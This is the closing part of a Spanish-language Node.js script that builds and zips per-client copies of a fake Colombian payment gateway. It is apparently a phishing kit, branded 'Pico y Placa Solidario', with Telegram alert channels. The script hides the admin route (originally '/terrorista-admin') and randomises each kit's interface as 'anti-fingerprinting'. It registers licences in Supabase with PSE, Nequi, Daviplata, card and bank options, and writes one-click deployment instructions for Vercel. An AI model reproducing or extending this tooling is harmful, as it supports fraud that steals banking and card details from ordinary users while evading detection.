      console.log(`  ✓ Landing page raíz establecida: pyp (app/page.tsx)`);
    }
  } else {
    const projDir = path.join(ROOT_DIR, 'app', selectedProject);
    const srcPage = path.join(projDir, 'page.tsx');
    if (fs.existsSync(srcPage)) {
      fs.copyFileSync(srcPage, path.join(destApp, 'page.tsx'));
      console.log(`  ✓ Landing [${selectedProject}] establecida como página principal (app/page.tsx)`);
    }
    const srcCss = path.join(projDir, 'global.css');
    if (fs.existsSync(srcCss)) {
      fs.copyFileSync(srcCss, path.join(destApp, 'global.css'));
      console.log(`  ✓ Estilos [${selectedProject}] copiados a (app/global.css)`);
    }
  }

  // 7. Copia selectiva de 'components/'
  console.log('\n[3/5] Copiando componentes modulares correspondientes...');
  const destComponents = path.join(OUTPUT_DIR, 'components');
  fs.mkdirSync(destComponents, { recursive: true });

  for (const compDir of CORE_COMPONENTS_DIRS) {
    const src = path.join(ROOT_DIR, 'components', compDir);
    const dest = path.join(destComponents, compDir);
    if (fs.existsSync(src)) {
      copyDirRecursive(src, dest);
      console.log(`  ✓ Componente Core: components/${compDir}/`);
    }
  }

  // Asegurar disponibilidad de componentes admin en components/[adminSlug]
  const srcXdmComp = path.join(ROOT_DIR, 'components', 'xdm');
  if (fs.existsSync(srcXdmComp) && adminSlug !== 'xdm') {
    const destAdminComp = path.join(destComponents, adminSlug);
    copyDirRecursive(srcXdmComp, destAdminComp);
    console.log(`  ✓ Componentes Admin vinculados a: components/${adminSlug}/`);
  }

  for (const compFile of CORE_COMPONENTS_FILES) {
    const src = path.join(ROOT_DIR, 'components', compFile);
    const dest = path.join(destComponents, compFile);
    if (fs.existsSync(src)) {
      fs.copyFileSync(src, dest);
      console.log(`  ✓ Componente utilitario: ${compFile}`);
    }
  }

  // Componentes específicos del proyecto seleccionado
  const srcProjComponents = path.join(ROOT_DIR, 'components', selectedProject);
  if (fs.existsSync(srcProjComponents)) {
    const destProjComponents = path.join(destComponents, selectedProject);
    copyDirRecursive(srcProjComponents, destProjComponents);
    console.log(`  ✓ Componentes específicos del proyecto: components/${selectedProject}/`);
  }

  // 8. Reemplazo recursivo y ofuscación de /terrorista-admin -> /[adminSlug]
  console.log(`\n[4/5] Aplicando ofuscación de seguridad: /terrorista-admin -> /${adminSlug}...`);
  const xdmRegex = /(?<!api)\/xdm(?=[/'"`\s\)\},]|$)/g;
  replaceInFilesRecursive(OUTPUT_DIR, xdmRegex, `/${adminSlug}`);
  console.log(`  ✓ Rutas del panel actualizadas correctamente en todos los archivos.`);

  // 8.1. Generar ID Único de Proyecto / Cliente para el Superadmin
  const dateStr = new Date().toISOString().slice(0, 10).replace(/-/g, '');
  const randomSuffix = crypto.randomBytes(4).toString('hex').toUpperCase();
  const uniqueClientId = `CLI_${dateStr}_${randomSuffix}`;
  const projectName = exportName !== 'cliente_entrega' 
    ? exportName.toUpperCase() 
    : (selectedProject === 'pyp' ? `PASARELA_${randomSuffix}` : selectedProject.toUpperCase());

  console.log(`\n[*] Identificador único de cliente generado: [ ${uniqueClientId} ]`);

  // 8.2. Generar UI Aleatoria para el Panel de Administración y Wizard (Anti-fingerprinting por cliente)
  console.log(`\n[+] Generando diseño y tema visual único para el Panel Admin y Wizard...`);
  
  const themeArg = getCliArg('theme');
  const selectedTheme = (themeArg && UI_THEMES.find(t => t.id === themeArg)) || UI_THEMES[Math.floor(Math.random() * UI_THEMES.length)];
  
  const formattedName = (exportName === 'cliente_entrega' ? 'PYP' : exportName)
    .replace(/[-_]/g, ' ')
    .replace(/\b\w/g, c => c.toUpperCase());
    
  const BRAND_SUFFIXES = ['Console', 'Control', 'Terminal', 'Gateway', 'Portal', 'Hub', 'Manager'];
  const brandSuffix = BRAND_SUFFIXES[Math.floor(Math.random() * BRAND_SUFFIXES.length)];
  const adminBrandTitle = `${formattedName} ${brandSuffix}`;
  const adminBrandSubtitle = 'Panel Operativo y Monitoreo Seguro';

  const LOGIN_VARIANTS = ['glassmorphism', 'cyber_terminal', 'executive'];
  const chosenLoginVariant = LOGIN_VARIANTS[Math.floor(Math.random() * LOGIN_VARIANTS.length)];

  const SIDEBAR_STYLES = ['docked', 'floating'];
  const chosenSidebarStyle = SIDEBAR_STYLES[Math.floor(Math.random() * SIDEBAR_STYLES.length)];

  // A. Escribir pantalla de login personalizada
  const loginDir = path.join(destAdmin, 'login');
  if (fs.existsSync(loginDir)) {
    const loginContent = generateLoginPageContent(chosenLoginVariant, selectedTheme, adminBrandTitle, adminBrandSubtitle, adminSlug);
    fs.writeFileSync(path.join(loginDir, 'page.tsx'), loginContent, 'utf8');
    console.log(`  ✓ Pantalla de Login generada [Variante: ${chosenLoginVariant}]`);
  }

  // B. Aplicar estilo de Sidebar (Docked vs Flotante)
  const sidebarFile = path.join(destComponents, adminSlug, 'XdmSidebar.tsx');
  if (fs.existsSync(sidebarFile)) {
    let sbContent = fs.readFileSync(sidebarFile, 'utf8');
    if (chosenSidebarStyle === 'floating') {
      sbContent = sbContent.replace(
        '<aside className="w-64 bg-zinc-950 border-r border-zinc-800 h-full flex flex-col text-zinc-100">',
        `<aside className="w-64 bg-${selectedTheme.card} border border-${selectedTheme.border} rounded-2xl m-3 h-[calc(100vh-1.5rem)] flex flex-col text-zinc-100 shadow-xl">`
      );
      console.log(`  ✓ Estilo de Navegación: Sidebar Flotante moderna`);
    } else {
      console.log(`  ✓ Estilo de Navegación: Sidebar Clásica integrada`);
    }
    fs.writeFileSync(sidebarFile, sbContent, 'utf8');
  }

  // C. Reemplazo de paleta y branding en componentes de admin y dashboard
  const adminTargets = [
    destAdmin,
    path.join(destComponents, adminSlug),
    path.join(destComponents, 'xdm_components')
  ];

  for (const targetDir of adminTargets) {
    if (!fs.existsSync(targetDir)) continue;

    // Colores y acentos
    replaceInFilesRecursive(targetDir, /text-emerald-500/g, `text-${selectedTheme.accent}-500`);
    replaceInFilesRecursive(targetDir, /text-emerald-400/g, `text-${selectedTheme.accent}-400`);
    replaceInFilesRecursive(targetDir, /text-emerald-600/g, `text-${selectedTheme.accent}-600`);
    replaceInFilesRecursive(targetDir, /text-emerald-700/g, `text-${selectedTheme.accent}-700`);
    replaceInFilesRecursive(targetDir, /bg-emerald-500\/10/g, `bg-${selectedTheme.accent}-500/10`);
    replaceInFilesRecursive(targetDir, /bg-emerald-500\/20/g, `bg-${selectedTheme.accent}-500/20`);
    replaceInFilesRecursive(targetDir, /bg-emerald-500/g, `bg-${selectedTheme.accent}-500`);
    replaceInFilesRecursive(targetDir, /bg-emerald-600/g, `bg-${selectedTheme.accent}-600`);
    replaceInFilesRecursive(targetDir, /border-emerald-500\/20/g, `border-${selectedTheme.accent}-500/20`);
    replaceInFilesRecursive(targetDir, /border-emerald-500\/30/g, `border-${selectedTheme.accent}-500/30`);
    replaceInFilesRecursive(targetDir, /border-emerald-500/g, `border-${selectedTheme.accent}-500`);
    replaceInFilesRecursive(targetDir, /from-emerald-500/g, `from-${selectedTheme.accent}-500`);
    replaceInFilesRecursive(targetDir, /to-emerald-700/g, `to-${selectedTheme.accent}-700`);
    replaceInFilesRecursive(targetDir, /selection:bg-emerald-500\/30/g, `selection:bg-${selectedTheme.accent}-500/30`);
    replaceInFilesRecursive(targetDir, /selection:text-emerald-200/g, `selection:text-${selectedTheme.accent}-200`);

    // Fondos y bordes oscuros del tema
    replaceInFilesRecursive(targetDir, /bg-zinc-950/g, `bg-${selectedTheme.bg}`);
    replaceInFilesRecursive(targetDir, /bg-zinc-900/g, `bg-${selectedTheme.card}`);
    replaceInFilesRecursive(targetDir, /border-zinc-800/g, `border-${selectedTheme.border}`);

    // Textos y branding
    replaceInFilesRecursive(targetDir, /XDM Control/g, adminBrandTitle);
    replaceInFilesRecursive(targetDir, /Pico y Placa Solidario • Bucket Supabase/g, `${formattedName} • Pasarela Segura`);
  }

  // D. Generar UI aleatoria y personalizada para wizard.html
  const wizardFile = path.join(OUTPUT_DIR, 'public', 'wizard.html');
  const wizardInfo = randomizeWizardHtml(wizardFile, selectedTheme, adminBrandTitle, formattedName, projectName, adminSlug);
  if (wizardInfo) {
    console.log(`  ✓ Wizard.html personalizado [Fuente: ${wizardInfo.font}, Borde: ${wizardInfo.radius}]`);
  }

  console.log(`  ✓ Paleta aplicada: [${selectedTheme.name.toUpperCase()}]`);
  console.log(`  ✓ Branding aplicado: "${adminBrandTitle}"`);

  // 9. Registrar e inicializar en Supabase automáticamente
  try {
    const supabaseUrl = getCoreGatewayEndpoint();
    const supabaseToken = getCoreGatewayToken();
    const supabase = createClient(supabaseUrl, supabaseToken);

    const configsToInsert = [
      { pypid: uniqueClientId, clave: 'status_licencia', valor: 'activa', tipo: 'string', descripcion: 'Estado de la licencia en Supabase' },
      { pypid: uniqueClientId, clave: 'nombre_proyecto', valor: projectName, tipo: 'string', descripcion: 'Nombre del proyecto del cliente' },
      { pypid: uniqueClientId, clave: 'admin_path', valor: `/${adminSlug}`, tipo: 'string', descripcion: 'Ruta privada del panel de administracion' },
      { pypid: uniqueClientId, clave: 'fecha_creacion', valor: new Date().toISOString(), tipo: 'string', descripcion: 'Fecha de generacion del paquete' },
      { pypid: uniqueClientId, clave: 'pago_pse', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar PSE' },
      { pypid: uniqueClientId, clave: 'tarjeta_credito_debito', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Tarjeta' },
      { pypid: uniqueClientId, clave: 'bre_b', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Bre-B' },
      { pypid: uniqueClientId, clave: 'bancolombia_qr', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar QR' },
      { pypid: uniqueClientId, clave: 'daviplata', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Daviplata' },
      { pypid: uniqueClientId, clave: 'nequi', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Nequi' }
    ];

    await supabase.from('pyp_configuraciones_globales').upsert(configsToInsert, { onConflict: 'pypid,clave' });

    const banksToInsert = DEFAULT_BANKS.map(b => ({
      pypid: uniqueClientId,
      codigo: b.codigo,
      nombre: b.nombre,
      active: true
    }));

    await supabase.from('pyp_bancos_autorizados').upsert(banksToInsert, { onConflict: 'pypid,codigo' });
    console.log(`  ✓ Cliente registrado exitosamente en Supabase (${DEFAULT_BANKS.length} bancos aprovisionados).`);

  } catch (err) {
    console.log(`  [!] Nota: Registro offline preparado (${err.message})`);
  }

  // 11. Crear .env limpio para el cliente
  console.log('\n[5/5] Generando archivos .env y manual de instrucciones...');
  const cleanEnvContent = `# ==============================================================================
# CONFIGURACION DE LA PASARELA DE PAGOS (CLIENTE)
# ==============================================================================

# 1. Telegram: Bot Token de @BotFather (Ej: 1234567890:ABCdefGhIJKlmNoPQRsTUVwxyZ)
TELEGRAM_BOT=

# 2. Telegram: Chat ID del grupo o canal donde recibiras las alertas (Ej: -1001234567890)
TELEGRAM_CHAT=

# 3. Telegram: Canal de auditoria y logs en tiempo real (Opcional)
TELEGRAM_CHAT_LOGS=

# 4. Identificador de Licencia y Proyecto (Unico para este Cliente)
TELEGRAM_DTA=${uniqueClientId}
PROYECTO=${projectName}
OFFER_PAGE=/

# 5. Credenciales y Ruta Privada de tu Panel de Administracion
ADMIN_PATH=/${adminSlug}
XDM_USER=admin
XDM_PASSWORD=
`;

  fs.writeFileSync(path.join(OUTPUT_DIR, '.env'), cleanEnvContent, 'utf8');
  fs.writeFileSync(path.join(OUTPUT_DIR, '.env.example'), cleanEnvContent, 'utf8');
  console.log(`  ✓ .env generado con identificador unico y ruta /${adminSlug}`);

  const readmeContent = `==============================================================================
                    GUIA DE INSTALACION RAPIDA - ${adminBrandTitle.toUpperCase()}
==============================================================================

¡Bienvenido! Tienes opciones sencillas para poner a funcionar tu sistema:

------------------------------------------------------------------------------
ACCESO A TU PANEL DE ADMINISTRACION:
------------------------------------------------------------------------------
• URL Local:       http://localhost:3000/${adminSlug}
• URL Producción:  https://tudominio.com/${adminSlug}
• Tema de Diseño:  ${selectedTheme.name} (${chosenLoginVariant})
(Por motivos de seguridad, la ruta de este panel es privada).

------------------------------------------------------------------------------
OPCION 1: INSTALACION EN TU COMPUTADOR (WINDOWS) - MODO 1-CLIC
------------------------------------------------------------------------------
1. Haz DOBLE CLIC en el archivo "INICIAR_SISTEMA.bat".
2. Se abrira automaticamente tu navegador en: http://localhost:3000/wizard.html
3. Ingresa tu Bot Token de Telegram, tu Chat ID y tu clave de Administrador.
4. Presiona "⚡ Configurar e Instalar Todo Automáticamente".
5. ¡Listo! Podras acceder a tu panel en http://localhost:3000/${adminSlug}

------------------------------------------------------------------------------
OPCION 2: DESPLIEGUE DIRECTO A VERCEL (SIN GIT NI GITHUB) - RECOMENDADO
------------------------------------------------------------------------------
1. Haz DOBLE CLIC en "SUBIR_A_VERCEL_SIN_GIT.bat".
2. El asistente en consola te pedira tu Bot Token de Telegram, Chat ID y Clave.
3. Inicia sesion en Vercel cuando te lo solicite y presiona Enter.
4. En 1 minuto tu pasarela estara publicada en internet y te entregara tu enlace en vivo.

------------------------------------------------------------------------------
OPCION 3: DESPLIEGUE CON GITHUB Y VERCEL
------------------------------------------------------------------------------
1. Haz doble clic en "DESPLEGAR_PRODUCCION.bat" o sube esta carpeta a GitHub.
2. En tu panel de Vercel (https://vercel.com), importa tu repositorio.
3. En "Environment Variables", agrega las variables de tu archivo .env.
4. Haz clic en "Deploy" y listo.

==============================================================================
`;

  fs.writeFileSync(path.join(OUTPUT_DIR, 'LEEME_INSTRUCCIONES.txt'), readmeContent, 'utf8');
  console.log('  ✓ LEEME_INSTRUCCIONES.txt creado.');

  // 12. Comprimir automáticamente a ZIP
  console.log(`\n[+] Comprimiendo paquete a ${exportName}.zip...`);
  try {
    const { execSync } = require('child_process');
    if (fs.existsSync(zipPath)) {
      fs.unlinkSync(zipPath);
    }
    execSync(`powershell -Command "Compress-Archive -Path '${OUTPUT_DIR}\\*' -DestinationPath '${zipPath}' -Force"`, { stdio: 'ignore' });
    console.log(`  ✓ Archivo ZIP creado: ${zipPath}`);
  } catch (zErr) {
    console.log(`  [!] Nota: No se pudo comprimir automáticamente (${zErr.message})`);
  }

  console.log('\n==============================================================================');
  console.log('✅ PAQUETE GENERADO Y AISLADO CON EXITO:');
  console.log(`👉 Paquete:       ${exportName}`);
  console.log(`👉 Proyecto:      ${selectedProject.toUpperCase()}`);
  console.log(`👉 Panel Admin:   /${adminSlug} (antes /terrorista-admin)`);
  console.log(`👉 UI Branding:   ${adminBrandTitle}`);
  console.log(`👉 Tema Visual:   ${selectedTheme.name} (${selectedTheme.accent})`);
  console.log(`👉 Estilo Login:  ${chosenLoginVariant}`);
  console.log(`👉 Wizard UI:     ${wizardInfo ? wizardInfo.font : 'Custom'}, ${wizardInfo ? wizardInfo.radius : '1.5rem'}`);
  console.log(`👉 Licencia / ID: ${uniqueClientId}`);
  console.log(`👉 Carpeta:       ${OUTPUT_DIR}`);
  console.log(`👉 Archivo ZIP:   ${zipPath}`);
  console.log('==============================================================================');
}

runExport().catch(err => {
  console.error('[!] Error en exportacion:', err);
  process.exit(1);
});
